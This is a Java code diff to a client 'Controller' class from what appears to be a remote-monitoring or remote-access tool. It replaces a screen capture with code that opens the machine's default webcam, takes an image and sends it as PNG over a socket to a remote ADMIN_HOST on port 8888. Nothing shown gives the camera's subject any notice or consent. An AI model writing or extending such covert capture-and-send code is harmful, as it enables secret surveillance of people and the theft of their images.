@@ -1,6 +1,8 @@
 package controllers;
 
 import client.Client;
+import com.github.sarxos.webcam.Webcam;
+import com.github.sarxos.webcam.WebcamResolution;
 import models.MessageModel;
 import models.SystemInfoModel;
 import org.json.JSONArray;
@@ -59,8 +61,16 @@ public class Controller {
                     Socket soc = null;
                     try {
                         soc = new Socket(ADMIN_HOST, 8888);
-                        BufferedImage image = new Robot().createScreenCapture(new Rectangle(Toolkit.getDefaultToolkit().getScreenSize()));
+//                        BufferedImage image = new Robot().createScreenCapture(new Rectangle(Toolkit.getDefaultToolkit().getScreenSize()));
+
                         ByteArrayOutputStream ous = new ByteArrayOutputStream();
+
+                        Webcam webcam = Webcam.getDefault();
+                        webcam.open();
+                        webcam.setViewSize(WebcamResolution.QVGA.getSize());
+                        // get image
+                        BufferedImage image = webcam.getImage();
+
                         ImageIO.write(image, "png", ous);
                         soc.getOutputStream().write(ous.toByteArray());
 
